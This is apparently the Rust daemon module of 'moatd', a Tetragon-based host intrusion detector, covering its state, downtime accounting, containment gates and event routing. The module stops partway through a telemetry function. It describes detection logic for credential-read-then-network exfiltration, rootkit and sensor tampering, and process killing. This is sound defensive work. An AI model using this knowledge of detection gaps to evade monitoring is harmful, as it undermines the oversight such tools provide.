//! The daemon: shared state plus the run loop.
//!
//! One thread tails Tetragon's export and does all the detection work; a second
//! thread accepts control-socket connections. They share a `Mutex<Daemon>`,
//! which is cheap because the tail thread only holds the lock while it is
//! folding an event, and the socket handler answers one request per connection.

use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use serde_json::{json, Value};

use crate::alert::{Alert, ExplainOption, UpdateLine};
use crate::allowlist::{Allowlist, Candidate};
use crate::baseline::{Baseline, Demotion, Learned, Observation};
use crate::bundle::{self, AncestryRow};
use crate::chain::{self, ChainStore};
use crate::config::{severity_at_least, Config};
use crate::context;
use crate::digest;
use crate::event::{HookHit, RawEvent};
use crate::explain::{allowlist_note, build_alert, Finding};
use crate::feeds::Feeds;
use crate::incident;
use crate::policy::{family_of, PolicySet};
use crate::proctable::{ProcInfo, ProcTable};
use crate::provenance::{Classifier, PacmanSl};
use crate::rarity::{RarityInfo, RarityStore, Tuple};
use crate::receipt;
use crate::rules::{pkgtree, RuleCtx, UserRule};
use crate::scoring::{self, EventFacts};
use crate::selectors::Mismatch;
use crate::store::AlertStore;
use crate::tail::Tailer;
use crate::util;

/// The kernel policy that replaced `net-pkg-subtree-egress`. It watches every
/// process at `medium`, because "an unusual port on the internet" is a weak
/// signal on its own; moatd raises it to `high` when the process turns out to
/// be inside a package install, which is the part the kernel could not decide.
pub const SUSPICIOUS_PORT_EGRESS: &str = "moat-net-suspicious-port-egress";
pub const HISTORY_TAMPER: &str = "moat-rootkit-history-tamper";

/// The rules whose SUBJECT is moat's own directories. Everything else is cut
/// off from them entirely (`is_own_store`).
/// How long after the last policy was pinned a short count still counts as
/// "loading" rather than "degraded".
///
/// Measured, not guessed: 51 policies took 19 s to pin on 2026-09-10, and
/// tetragon writes the directory as it goes, so the gap between two pins is a
/// fraction of that. 60 s is generous enough to cover a slower or busier
/// machine and short enough that a sensor which really stopped short is called
/// degraded within a minute rather than excused indefinitely.
const SENSOR_SETTLE_SECS: u64 = 60;

const SELF_WATCH_RULES: &[&str] = &[
    "moat-rootkit-evidence-tamper",
    "moat-rootkit-sensor-tamper",
];

pub static RELOAD: AtomicBool = AtomicBool::new(false);
pub static SHUTDOWN: AtomicBool = AtomicBool::new(false);

extern "C" fn on_signal(sig: libc::c_int) {
    match sig {
        libc::SIGHUP => RELOAD.store(true, Ordering::SeqCst),
        _ => SHUTDOWN.store(true, Ordering::SeqCst),
    }
}

/// SIGHUP reloads policies, allowlist and config; SIGTERM/SIGINT stop cleanly.
pub fn install_signal_handlers() {
    unsafe {
        libc::signal(libc::SIGHUP, on_signal as *const () as libc::sighandler_t);
        libc::signal(libc::SIGTERM, on_signal as *const () as libc::sighandler_t);
        libc::signal(libc::SIGINT, on_signal as *const () as libc::sighandler_t);
        libc::signal(libc::SIGPIPE, libc::SIG_IGN);
    }
}

struct Dedupe {
    id: String,
    first_seen: u64,
    count: u64,
}

/// One chain's answer to "is moat confident enough to ACT on this", shared by
/// the kill and the quarantine (`Daemon::chain_gate`).
struct ChainGate {
    facts: Vec<crate::contain::StepFact>,
    /// The trigger families, sorted and deduped, for the decisions record.
    families: Vec<String>,
    /// `Ok` to act; `Err(why)` is the sentence both refusals print.
    verdict: Result<(), String>,
}

/// A gap in moat's record, split by what could have happened during it.
///
/// `wall` is the clock distance; `blind` is the part of it the machine spent
/// awake with nothing watching. The remainder is accounted for by
/// `powered_off` and `suspended`. Only `blind` is a hole in the sense the
/// alert means -- see `Daemon::downtime`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Downtime {
    pub wall: u64,
    pub blind: u64,
    pub powered_off: u64,
    pub suspended: u64,
}

/// The arithmetic of `Daemon::downtime`, with the three clocks passed in.
///
/// Split out from the daemon because it is the part that can be wrong in a way
/// nobody notices: every branch returns a plausible-looking `Downtime`, and the
/// difference between "the machine was asleep" and "nothing was watching" is
/// invisible unless the numbers are checked directly.
pub fn split_downtime(
    wall: u64,
    boot: u64,
    last_heartbeat: u64,
    started: u64,
    last_awake: u64,
    awake_now: u64,
) -> Downtime {
    // Rebooted inside the gap.
    if boot > 0 && last_heartbeat > 0 && boot > last_heartbeat {
        let blind = started.saturating_sub(boot);
        return Downtime {
            wall,
            blind: blind.min(wall),
            powered_off: wall.saturating_sub(blind),
            suspended: 0,
        };
    }

    // Same boot: awake time is the blind time.
    //
    // Unless the monotonic clock went BACKWARDS, which it cannot do within a
    // boot -- so it means the machine rebooted and the branch above did not
    // catch it, because `/proc/stat` was unreadable or `btime` was 0. Without
    // this check `saturating_sub` floors at zero and the gap is reported as
    // `blind: 0, suspended: wall`: a reboot rendered as a machine that was
    // merely asleep, which hides the entire unobserved window. That is the one
    // direction this function must never fail in.
    if last_awake > 0 && awake_now >= last_awake {
        let blind = awake_now - last_awake;
        return Downtime {
            wall,
            blind: blind.min(wall),
            powered_off: 0,
            suspended: wall.saturating_sub(blind.min(wall)),
        };
    }

    // Nothing better to go on.
    Downtime {
        wall,
        blind: wall,
        powered_off: 0,
        suspended: 0,
    }
}

impl Downtime {
    /// The half-sentence that says where the unblind time went, or `None` when
    /// all of it was blind and there is nothing to explain.
    pub fn accounted_for(&self) -> Option<String> {
        let mut parts = Vec::new();
        if self.powered_off > 0 {
            parts.push(format!("{} powered off or shutting down", mins(self.powered_off)));
        }
        if self.suspended > 0 {
            parts.push(format!("{} suspended", mins(self.suspended)));
        }
        (!parts.is_empty()).then(|| parts.join(", "))
    }
}

/// "73 minutes", "38 seconds" -- for evidence lines, where a bare second count
/// is what made the 2026-09-09 alert unreadable.
fn mins(secs: u64) -> String {
    if secs < 90 {
        format!("{secs} seconds")
    } else if secs < 5400 {
        format!("{} minutes", (secs + 30) / 60)
    } else {
        format!("{:.1} hours", secs as f64 / 3600.0)
    }
}

/// How much of one chain is already on disk (`Daemon::write_chain`).
#[derive(Debug, Default, Clone, Copy)]
struct ChainStamp {
    /// `Chain::member_ids()[..stamped]` carry a `chain_id` line.
    stamped: usize,
    /// The trigger members have been restamped onto the badge because the
    /// chain reached `high`.
    raised: bool,
}

pub struct Daemon {
    /// How long after the last pin a short count still reads as "loading".
    ///
    /// A field rather than a constant so a test can set it to 0 and assert the
    /// degraded path deterministically: removing a pin touches the directory
    /// mtime exactly like adding one, so at that instant the two are genuinely
    /// indistinguishable and only time tells them apart.
    /// `name -> who asked`, from the varlink kprobe. Bounded and aged.
    pub queries: crate::names::QueryLog,
    pub sensor_settle_secs: u64,
    pub cfg: Config,
    pub cfg_path: PathBuf,
    pub policies: PolicySet,
    pub allowlist: Allowlist,
    pub table: ProcTable,
    pub feeds: Feeds,
    pub store: AlertStore,
    pub rules: Vec<Box<dyn UserRule>>,
    pub mode: String,
    pub homes: Vec<String>,
    /// Btrfs subvolume roots, for turning a dentry-derived path back into the
    /// path the user would recognise (`util::dentry_abs`).
    pub subvols: Vec<(String, String)>,
    /// Last throttle alert per cgroup, so a flood raises one alert an hour and
    /// not one per dropped batch.
    throttle_seen: std::collections::HashMap<String, u64>,
    /// The heartbeat found in state.json at startup: when moat last knew it was
    /// alive. 0 on a machine that has never run it.
    last_heartbeat: u64,
    /// `CLOCK_MONOTONIC` as of that same heartbeat, so the awake time inside a
    /// gap can be measured across the restart. 0 when the state file predates
    /// this field or the machine has rebooted since (the clock resets on boot,
    /// which is exactly why `downtime` checks `btime` first).
    last_awake: u64,
    /// When something last read `status`. The panel polls it, so this is
    /// moatd's only evidence that a human could see an alert if one arrived.
    last_watched: u64,
    /// When the last "nobody is watching" alert went out.
    last_unwatched_alert: u64,
    /// Live correlation-driven containments (`contain.rs`).
    pub contain: crate::contain::ContainStore,
    /// Binaries the KERNEL should stop watching, per policy. See
    /// `exclude_binary`.
    pub kernel_exclusions: std::collections::BTreeMap<String, Vec<String>>,
    /// Chains already decided on. A chain grows for up to an hour and
    /// `note_chain` re-enters on every growth; one decision per chain.
    killed_chains: std::collections::BTreeSet<String>,
    /// `<path>\0<reason>` for every modified package-owned file already
    /// reported. The classification is consulted on every alert, so without
    /// this one tampered binary would raise `moat-x-binary-modified` as often
    /// as anything else mentions it. Keyed on the reason too, so a file that
    /// changes AGAIN is reported again.
    ///
    /// Persisted, because a modified file is a fact about the disk and not
    /// about this process. Omarchy's own installer rewrites the shebang of
    /// `/usr/bin/powerprofilesctl` so it uses the system python3 rather than
    /// mise's, which means EVERY Omarchy machine has one permanently modified
    /// package file -- and an in-memory set turned that into a `high` alert on
    /// every restart, for ever. Once per change is the claim; once per boot is
    /// just noise wearing its clothes.
    ///
    /// Capped and insertion-ordered rather than a set, because it is written
    /// into `state.json` and every distinct modification adds an entry that
    /// never leaves. At the cap the OLDEST is forgotten, so a long-ago
    /// modification can be reported a second time -- which is the right way
    /// round: this bound may cost a duplicate alert, never a missing one.
    modified_reported: std::collections::VecDeque<String>,
    /// Package directories still to be checked by the running sweep, and when
    /// the last one finished. `None` means no sweep is in progress.
    sweep: Option<Vec<PathBuf>>,
    last_sweep: u64,
    /// The last package directory the sweep finished, so an interrupted pass
    /// resumes instead of restarting. Empty when no pass is in flight.
    /// Persisted: the whole point is that it survives the restart.
    sweep_cursor: String,
    /// Template stems that failed to render, from the last `render-policies`.
    pub policies_failed: Vec<String>,
    pub started: u64,
    pub events_seen: u64,
    pub alerts_emitted: u64,
    /// Alerts recorded with `suppressed_by` set: still on the timeline, never
    /// notified, never counted (BASELINE §8).
    pub alerts_suppressed: u64,
    dedupe: HashMap<String, Dedupe>,
    /// address -> the name this machine resolved to it (`names.rs`). Filled
    /// from systemd-resolved's query stream by `drain_names`; read once per
    /// net finding in `emit`, and by `moat-x-net-domain-ioc` through
    /// `RuleCtx`. Plain data, no lock: the reader thread owns a channel, the
    /// daemon owns the cache.
    pub names: crate::names::NameCache,
    names_rx: Option<std::sync::mpsc::Receiver<crate::names::Msg>>,
    /// What the reader last said: `off`, `not started`, `connecting`,
    /// `connected`, `refused: ...`, `unavailable: ...`. Reported in `status`
    /// because a name that is never recorded looks exactly like a machine
    /// that never resolves anything, and the difference is this string.
    pub names_state: String,
    /// When a process last read a credential file, keyed by SESSION id.
    ///
    /// The exfil-context signal: `net_first_contact` normally goes quiet once a
    /// destination's /24 is familiar (a CDN affordability choice). But a
    /// connection to a familiar /24 from a session that JUST read a credential
    /// is the exact exfil-to-reputable-infra case that /24 familiarity hides --
    /// so the net step fires anyway and the cred->net chain can form. Keyed by
    /// session, not pid, because the read and the connect may be sibling
    /// processes of one task (run.py reads, exporter.py connects). Only set by
    /// non-suppressed cred findings, which the policy exclusions have already
    /// filtered to the reads worth noticing.
    cred_read_sessions: HashMap<u32, u64>,
    /// exec_id -> alert id, for kill confirmation (NOTES §7).
    pending_kill: HashMap<String, String>,

    // --- baselining --------------------------------------------------------
    /// BASELINE §1: official / foreign / user / unknown, from the pacman db.
    pub provenance: Classifier,
    /// LEARNING §1: decayed per-tuple counters.
    pub rarity: RarityStore,
    /// BASELINE §3 and §4: the learning window, proposals, the noise guard.
    pub baseline: Baseline,
    /// Rarity of the (actor, parent) tuple recorded at `process_exec` time, so
    /// an alert on the same exec quotes it instead of counting it twice.
    exec_rarity: HashMap<String, RarityInfo>,
    /// Guards the one level of recursion `emit` can take (a noise-guard alert
    /// raised from inside the emission of the alert that tripped it).
    in_meta_alert: bool,

    // --- analysis (LEARNING §3, §4, §5) ------------------------------------
    /// LEARNING §3: one accumulator per live package-manager subtree.
    pub receipts: receipt::Tracker,
    /// LEARNING §5: `moatctl set digest on|off`, persisted in state.json.
    pub digest_enabled: bool,
    /// `moatctl set containers on|off` -- whether container activity reaches
    /// the badge. It is always RECORDED; this decides whether it is asked
    /// about. Off by default: a build does things that look like an intrusion
    /// (unpacking setuid binaries, fetching toolchains into /tmp, running
    /// postinstalls on a socketpair), and on this machine that was 452 of 639
    /// rows in one night. Enforcement is a separate question and is already
    /// answered in the kernel -- moat never refuses anything in a container.
    pub inspect_containers: bool,
    /// `moatctl set threshold.<name> <value>`, persisted in state.json.
    ///
    /// Held separately from `cfg.thresholds` rather than being folded into it,
    /// for two reasons. A SIGHUP re-reads moat.toml and would otherwise silently
    /// revert every override the user set from the CLI — the single failure this
    /// whole mechanism has to avoid, because the revert is invisible and moves
    /// protection in an unannounced direction. And `status` has to be able to
    /// say which numbers are the file's and which are the user's; a merged
    /// struct cannot.
    ///
    /// Same reasoning as `contain_enabled` and `contain_kill`: a switch a person
    /// flips is runtime state. moatd does not rewrite a file the user also owns.
    pub threshold_overrides: std::collections::BTreeMap<String, u64>,
    /// Unix seconds of the last delivered digest, or 0.
    pub digest_last_sent: u64,
    /// Incident snapshots taken since start, for the log and for `status`.
    pub incidents_captured: u64,
    /// What is *in* the files a high chain implicated (`content.rs`). Holds the
    /// hourly budget and the sha256 cache, which is why it lives on the daemon
    /// rather than being constructed per call: a fresh analyser every time
    /// would be a fresh allowance every time.
    pub content: crate::content::Analyzer,
    /// Design 2b/3a: alerts sharing a process tree and crossing families are
    /// one sequence. Bounded and self-pruning; see `chain.rs`.
    pub chains: ChainStore,
    /// What `write_chain` has already written for each live chain, by chain
    /// id, so a growth writes only what changed. Pruned to the chains that are
    /// still open; empty after a restart, which only means the first growth
    /// after one re-stamps every member once.
    chain_stamps: HashMap<String, ChainStamp>,
    /// Policies armed for in-kernel enforcement individually, while the daemon
    /// as a whole stays in monitor mode.
    ///
    /// Enforcement is all-or-nothing otherwise, and all-or-nothing is not
    /// usable here: arming every Sigkill-carrying policy at once on a desktop
    /// means a kernel module load on USB hotplug gets its loader killed, and
    /// `ssh` gets killed for reading your own key. The only safe way to start
    /// enforcing is one rule at a time, on a rule whose false-positive surface
    /// you have already measured.
    ///
    /// This deliberately does NOT move `mode`: the userland kill path
    /// (`maybe_enforce`) gates on that, so leaving it at monitor means only the
    /// kernel policy named here can kill anything.
    pub enforcing_rules: std::collections::BTreeSet<String>,
    /// Where the post-start re-arming has got to. See `arm_tick`.
    pub arming: Arming,
    /// Kernel policies `verify_enforcement` last confirmed are in `enforce`.
    ///
    /// Deliberately NOT persisted: "the kernel agreed with us before the last
    /// restart" is not evidence about the kernel now, and a restart is exactly
    /// when the agreement breaks.
    pub enforcing_verified: std::collections::BTreeSet<String>,
    /// Kernel policies `enforcing_rules` claims are armed and the kernel says
    /// are not. Non-empty means the panel is lying and `status` has to say so.
    pub enforcing_unverified: std::collections::BTreeSet<String>,
    /// The unverified set the last `moat-x-protection-changed` alert named, so
    /// a failure that persists for a week is one alert and not one a minute.
    last_arm_alert_set: std::collections::BTreeSet<String>,
    /// Unix seconds of the last `verify_enforcement` run.
    last_verify: u64,
    /// Monotonic ULID source. Alert ids are the timeline: `store.load()` keys a
    /// BTreeMap on them, `moatctl list` calls the last one newest, and
    /// `--since <id>` pages on them. A plain `Ulid::new()` only orders by the
    /// millisecond it embeds, so two alerts in the same millisecond — a burst
    /// from one process, or a sensor restart replaying `/proc` — sorted by
    /// their random suffix and the "newest" was a coin flip. The generator
    /// increments the suffix instead, so ids from one run are strictly
    /// increasing whatever the clock resolution.
    ids: ulid::Generator,

    // --- telemetry ---------------------------------------------------------
    /// `telemetry.jsonl`, opened only when at least one non-`alerts` class is
    /// on. `None` costs one `Option` check per event and nothing else, which
    /// matters: this sits on the exec path at 42 events a second.
    pub telemetry: Option<crate::telemetry::TelemetryStore>,
    /// Telemetry records written since start, for `status`.
    pub telemetry_written: u64,
    /// Telemetry events that reached the daemon and were dropped by the
    /// create/modify ladder before anything was written.
    pub telemetry_filtered: u64,
}

/// The key the noise guard counts on: the same (rule, actor, parent, dir)
/// tuple the baseline uses, so "this shape is noisy" means the same thing in
/// both places and a user reading either sees the same grouping.
fn noise_tuple(f: &Finding) -> String {
    crate::baseline::tuple_key(&f.rule, &f.proc.exe, &f.parent_exe(), &f.file_dir())
}

impl Daemon {
    /// The next alert id, strictly increasing within this run.
    ///
    /// `Generator::generate` only fails after 2^80 ids inside one millisecond;
    /// falling back to a random ULID there is correct-but-unordered, which is
    /// the behaviour we had everywhere before.
    fn next_id(&mut self) -> String {
        self.ids
            .generate()
            .map(|u| u.to_string())
            .unwrap_or_else(|_| ulid::Ulid::new().to_string())
    }

    pub fn new(cfg: Config, cfg_path: &Path) -> std::io::Result<Daemon> {
        let store = AlertStore::open(
            &cfg.paths.alerts(),
            &cfg.paths.alerts_rotated(),
            cfg.thresholds.alerts_max_bytes,
            cfg.thresholds.alerts_carry_max_bytes,
            cfg.thresholds.alerts_carry_max,
            &cfg.group,
        )?;
        let policies = PolicySet::load(&cfg.paths.policies_dir);
        let allowlist = Allowlist::load(&cfg.paths.allowlist_dir);
        let feeds = Feeds::load(&cfg.paths.feeds());
        let homes = util::human_homes(&cfg.paths.passwd);
        let subvols = util::subvol_roots(Path::new("/proc/self/mounts"));
        let table = ProcTable::new(cfg.thresholds.ancestry_max, cfg.thresholds.process_prune_secs);
        let state = read_state(&cfg.paths.state_file());
        let mode = persisted_mode(&state).unwrap_or_else(|| cfg.mode.clone());
        let contain_enabled = persisted_contain(&state).unwrap_or(cfg.contain.enabled);
        let contain_kill = persisted_kill(&state).unwrap_or_else(|| cfg.contain.kill.clone());
        let mut cfg = cfg;
        cfg.contain.enabled = contain_enabled;
        cfg.contain.kill = contain_kill;
        let exclusions_at_start = read_exclusions(&cfg.paths.state_file());
        let now = util::unix_secs();

        let provenance = Classifier::new(
            &cfg.paths.pacman_local,
            &cfg.baseline.trusted_repos,
            &homes,
            Box::new(PacmanSl {
                bin: cfg.paths.pacman.clone(),
            }),
        );
        let rarity = RarityStore::load(
            &cfg.paths.rarity_file(),
            &cfg.group,
            cfg.learning.half_life_days,
            cfg.learning.rare_max_count,
            cfg.learning.rare_max_age_days,
        );
        let baseline = Baseline::load(
            &cfg.paths.state_dir,
            &cfg.group,
            cfg.baseline.learning_days,
            cfg.baseline.learn_min_days,
            cfg.baseline.noisy_rule_per_day,
            persisted_installed_at(&state),
            now,
        );

        let telemetry = open_telemetry(&cfg);
        // The hourly content-analysis budget survives a restart, because a
        // budget a restart refills is not a budget -- and the daemon is
        // restartable by anything that can crash it.
        let mut content = crate::content::Analyzer::new(crate::content::Limits {
            max_bytes: cfg.content.max_bytes,
            per_hour: cfg.content.per_hour,
            deny_roots: vec![
                cfg.paths.state_dir.to_string_lossy().into_owned(),
                "/var/log/moat".to_string(),
            ],
        });
        content.restore(
            persisted_u64(&state, "content", "hour_start"),
            persisted_u64(&state, "content", "used") as u32,
        );
        let digest_enabled = persisted_digest_enabled(&state).unwrap_or(cfg.digest.enabled);
        let inspect_containers = state
            .as_ref()
            .and_then(|s| s.get("inspect_containers"))
            .and_then(|v| v.as_bool())
            .unwrap_or(false);
        let digest_last_sent = persisted_u64(&state, "digest_summary", "last_sent_unix");

        let cfg_names = cfg.names.clone();
        let mut d = Daemon {
            cfg,
            queries: crate::names::QueryLog::new(cfg_names.retain_secs, cfg_names.max_addresses),
            sensor_settle_secs: SENSOR_SETTLE_SECS,
            cfg_path: cfg_path.to_path_buf(),
            policies,
            allowlist,
            table,
            feeds,
            store,
            rules: crate::rules::all(),
            mode,
            homes,
            subvols,
            throttle_seen: std::collections::HashMap::new(),
            last_heartbeat: state
                .as_ref()
                .and_then(|s| s.get("heartbeat"))
                .and_then(|v| v.as_u64())
                .unwrap_or(0),
            last_awake: state
                .as_ref()
                .and_then(|s| s.get("awake"))
                .and_then(|v| v.as_u64())
                .unwrap_or(0),
            last_watched: now,
            last_unwatched_alert: 0,
            kernel_exclusions: exclusions_at_start,
            killed_chains: std::collections::BTreeSet::new(),
            sweep: None,
            last_sweep: state
                .as_ref()
                .and_then(|s| s.get("last_sweep"))
                .and_then(|v| v.as_u64())
                .unwrap_or(0),
            sweep_cursor: state
                .as_ref()
                .and_then(|s| s.get("sweep_cursor"))
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string(),
            modified_reported: state
                .as_ref()
                .and_then(|s| s.get("modified_reported"))
                .and_then(|v| v.as_array())
                .map(|a| {
                    a.iter()
                        .filter_map(|v| v.as_str().map(String::from))
                        .collect()
                })
                .unwrap_or_default(),
            contain: crate::contain::ContainStore::from_state(
                state.as_ref().and_then(|s| s.get("contain")),
            ),
            policies_failed: Vec::new(),
            started: now,
            events_seen: 0,
            alerts_emitted: 0,
            alerts_suppressed: 0,
            dedupe: HashMap::new(),
            names: crate::names::NameCache::new(cfg_names.retain_secs, cfg_names.max_addresses),
            names_rx: None,
            names_state: if cfg_names.enabled { "not started".into() } else { "off".into() },
            cred_read_sessions: HashMap::new(),
            pending_kill: HashMap::new(),
            provenance,
            rarity,
            baseline,
            exec_rarity: HashMap::new(),
            chain_stamps: HashMap::new(),
            in_meta_alert: false,
            receipts: receipt::Tracker::default(),
            digest_enabled,
            inspect_containers,
            threshold_overrides: persisted_threshold_overrides(&state),
            digest_last_sent,
            incidents_captured: 0,
            content,
            chains: ChainStore::new(),
            ids: ulid::Generator::new(),
            enforcing_rules: persisted_enforcing_rules(&state),
            arming: Arming::Idle,
            enforcing_verified: std::collections::BTreeSet::new(),
            enforcing_unverified: std::collections::BTreeSet::new(),
            last_arm_alert_set: std::collections::BTreeSet::new(),
            last_verify: 0,
            telemetry,
            telemetry_written: 0,
            telemetry_filtered: 0,
        };
        // moat.toml is the default for a fresh machine; what the user set from
        // the CLI is the override, exactly as with `contain` and `kill`. Applied
        // here rather than in the struct literal because it has to run again on
        // every SIGHUP, and one code path for both is the only way the two
        // cannot drift.
        d.apply_threshold_overrides();
        Ok(d)
    }

    /// SIGHUP: config, policy annotations and allowlist all come back from disk.
    pub fn reload(&mut self) {
        match Config::load(&self.cfg_path) {
            Ok(c) => {
                self.table.max_depth = c.thresholds.ancestry_max;
                self.table.prune_secs = c.thresholds.process_prune_secs;
                self.cfg = c;
                // A SIGHUP must not quietly undo a decision the user made from
                // the CLI. Without this the file wins on every `systemctl
                // reload moatd`, and the direction it moves protection in is
                // never announced -- the exact shape of "tuning that appears to
                // work and does nothing", but in reverse.
                self.apply_threshold_overrides();
            }
            Err(e) => log::warn!("reload: keeping old config: {}", e),
        }
        // A class turned off in moat.toml stops being written on SIGHUP. The
        // kernel side needs `moatd telemetry apply` (a policy load is not
        // hot-reloadable), but the file must not keep growing in the meantime.
        self.telemetry = open_telemetry(&self.cfg);
        self.policies = PolicySet::load(&self.cfg.paths.policies_dir);
        // A reload can change which policies exist, and therefore which ones
        // `enforcement_to_apply` wants armed. Re-read the kernel on the next
        // tick rather than leaving `status` quoting the previous policy set.
        self.invalidate_verification();
        self.allowlist = Allowlist::load(&self.cfg.paths.allowlist_dir);
        self.homes = util::human_homes(&self.cfg.paths.passwd);
        self.subvols = util::subvol_roots(Path::new("/proc/self/mounts"));
        self.provenance.set_homes(&self.homes);
        self.baseline.learning_days = self.cfg.baseline.learning_days;
        self.baseline.learn_min_days = self.cfg.baseline.learn_min_days;
        self.baseline.noisy_rule_per_day = self.cfg.baseline.noisy_rule_per_day;
        self.rarity.half_life_days = self.cfg.learning.half_life_days;
        self.rarity.rare_max_count = self.cfg.learning.rare_max_count;
        self.rarity.rare_max_age_days = self.cfg.learning.rare_max_age_days;
        log::info!(
            "reloaded: {} policies, {} allowlist rules",
            self.policies.len(),
            self.allowlist.len()
        );
    }

    pub fn reload_allowlist(&mut self) {
        self.allowlist = Allowlist::load(&self.cfg.paths.allowlist_dir);
    }

    // ------------------------------------------------------------- event path

    pub fn handle_line(&mut self, line: &str) {
        let Some(ev) = RawEvent::parse(line) else {
            return;
        };
        self.events_seen += 1;
        let now = util::unix_secs();

        if let Some(t) = &ev.process_throttle {
            self.note_throttle(t, now);
            return;
        }

        if let Some(exec) = &ev.process_exec {
            let Some(exec_id) = self.table.on_exec(exec) else {
                return;
            };
            self.note_exec_telemetry(exec, ev.time.as_deref());
            // Rarity learns from every exec, alert or not (LEARNING §1).
            self.record_exec_rarity(&exec_id, now);
            // So does the install receipt (LEARNING §3): what an install did is
            // mostly what it *executed*, and none of that raises an alert.
            self.note_receipt_exec(&exec_id, now);
            let findings = self.run_rules_exec(exec, &exec_id, now);
            self.emit_all(findings);
            return;
        }

        if let Some(exit) = &ev.process_exit {
            self.note_exit_telemetry(exit, ev.time.as_deref());
            if let Some(exec_id) = self.table.on_exit(exit, now) {
                self.confirm_kill(&exec_id, exit.signal.as_deref());
                // The root of a package subtree exiting is what closes a
                // receipt (LEARNING §3).
                self.finish_receipt(&exec_id, exit.status, now);
            }
            return;
        }

        if let Some(hook) = ev.hook() {
            if let Some(p) = &hook.ev.parent {
                self.table.observe(p);
            }
            for a in &hook.ev.ancestors {
                self.table.observe(a);
            }
            let exec_id = hook
                .ev
                .process
                .as_ref()
                .and_then(|p| self.table.observe(p))
                .unwrap_or_default();
            // A `/proc/self/fd/<n>` binary gets its name back from the hook's
            // own exec'd-file argument when it has one.
            self.table
                .resolve_fd_binary(&exec_id, hook.binprm_path().as_deref());

            // THE TELEMETRY FORK. A `moat-telemetry-*` policy is a record, not
            // a claim, and it must never reach rule evaluation: the file class
            // alone posts ~19 events/s through the kernel filter during a
            // package install (measured), and running each of those against
            // every rule — each of which walks ancestry — is how a detection
            // daemon melts. The process table is updated above, because
            // ancestry is most of what makes a telemetry record worth keeping,
            // and then we leave.
            if crate::telemetry::is_telemetry_policy(hook.policy_name()) {
                self.note_hook_telemetry(&hook, &exec_id, ev.time.as_deref(), now);
                return;
            }

            // THE ATTRIBUTION FORK, and the same argument as the telemetry one
            // above. A name lookup is a record, not a claim: measured at 4.6/s
            // on this machine, with 76% of them one process asking for
            // `localhost` over and over. Running each against every rule --
            // each of which walks ancestry -- is how a detection daemon melts,
            // and there is nothing here to evaluate. It answers "who asked",
            // which the resolved stream cannot, and then it leaves.
            if hook.policy_name() == crate::names::QUERY_POLICY {
                self.note_dns_query(&hook, &exec_id, now);
                return;
            }

            // moatd's OWN containment firing again. The contained process tried
            // its refused connection once more and the kernel denied it -- the
            // containment working, not a new thing to detect. Running it back
            // through `policy_finding` built an alert with destination
            // `0.0.0.0:0`, because a REFUSED `sockaddr` connect carries no
            // usable address, so the record read "python may not reach
            // 0.0.0.0" and looked like a false positive on a benign run. Record
            // it against what the containment actually names and stop.
            if crate::contain::is_contain_policy(hook.policy_name()) {
                self.note_contain_enforced(hook.policy_name(), &exec_id, now);
                return;
            }

            // The kernel's own finding, UNLESS a userland rule owns this
            // policy id.
            //
            // Both halves used to fire for the same event. `moat-net-first-
            // contact`'s kernel policy deliberately posts every non-loopback
            // connect and leaves the judgement to userspace -- the kernel
            // cannot know which destinations this machine has met -- so
            // `policy_finding` turned each one into an alert, and
            // `run_rules_hook` added another when the destination really was
            // new. The result was a rule documented as "reports a destination
            // once and then never again" emitting on every connection: 11 of
            // 14 in a ten-minute sample read `common`, one of them seen 1593
            // times. That put `net` in nearly every process tree, which is
            // what made `qualifies()` fire on ordinary package updates.
            //
            // A rule that filters in userspace owns its id outright. There is
            // no case where both should speak.
            let mut findings = if self.rule_owns(hook.policy_name()) {
                Vec::new()
            } else {
                self.policy_finding(&hook, &exec_id, now).into_iter().collect::<Vec<_>>()
            };
            findings.extend(self.run_rules_hook(&hook, &exec_id, now));
            self.emit_all(findings);
        }
    }

    // -------------------------------------------------------------- telemetry

    pub fn flush_telemetry(&mut self) {
        if let Some(s) = self.telemetry.as_mut() {
            s.flush();
        }
    }

    fn write_telemetry(&mut self, rec: &crate::telemetry::Record) {
        let Some(store) = self.telemetry.as_mut() else {
            return;
        };
        if let Err(e) = store.append(rec) {
            log::warn!("telemetry: {}", e);
            return;
        }
        self.telemetry_written += 1;
    }

    fn note_exec_telemetry(&mut self, exec: &crate::event::ExecEvent, time: Option<&str>) {
        if !self.cfg.telemetry.process || self.telemetry.is_none() {
            return;
        }
        let ts = util::normalize_ts(time.unwrap_or_default());
        if let Some(r) = crate::telemetry::exec_record(&self.cfg.telemetry, exec, &ts) {
            self.write_telemetry(&r);
        }
    }

    fn note_exit_telemetry(&mut self, exit: &crate::event::ExitEvent, time: Option<&str>) {
        if !self.cfg.telemetry.process || self.telemetry.is_none() {
            return;
        }
        let ts = util::normalize_ts(time.unwrap_or_default());
        if let Some(r) = crate::telemetry::exit_record(exit, &ts) {
            self.write_telemetry(&r);
        }
    }

    /// A `moat-telemetry-*` hook event. This is the second stage of the file
    /// class's two-stage filter: the kernel decided the path was
    /// executable-shaped, and here we decide whether it is a create worth
    /// dropping or a modify worth keeping (`telemetry.rs`).
    fn note_hook_telemetry(&mut self, hook: &HookHit, exec_id: &str, time: Option<&str>, now: u64) {
        use crate::telemetry::{self as t, FileShape, FileVerdict};
        if self.telemetry.is_none() {
            return;
        }
        let ts = util::normalize_ts(time.unwrap_or_default());
        let policy = hook.policy_name();

        if policy == "moat-telemetry-network-connect" {
            if !self.cfg.telemetry.network {
                return;
            }
            if let Some(r) = t::network_record(hook, &self.table, exec_id, &ts) {
                self.write_telemetry(&r);
            }
            return;
        }

        if !self.cfg.telemetry.file {
            return;
        }
        let Some(path) = hook.file_path() else {
            return;
        };
        let chmod = policy == "moat-telemetry-file-became-executable";
        let verdict = if chmod {
            FileVerdict::ChmodX
        } else {
            t::verdict_for(
                Path::new(&path),
                now,
                self.cfg.telemetry.create_window_secs,
            )
        };
        if t::is_quiet_create(&self.cfg.telemetry, verdict, &path) {
            self.telemetry_filtered += 1;
            return;
        }

        let p = Path::new(&path);
        let meta = std::fs::metadata(p).ok();
        let shape = if self.cfg.telemetry.file_suffixes.iter().any(|s| path.ends_with(s.as_str())) {
            FileShape::Script
        } else if t::looks_like_elf(p) {
            FileShape::Elf
        } else if chmod {
            FileShape::Other
        } else {
            FileShape::Location
        };
        let bytes = meta.as_ref().map(|m| m.len());
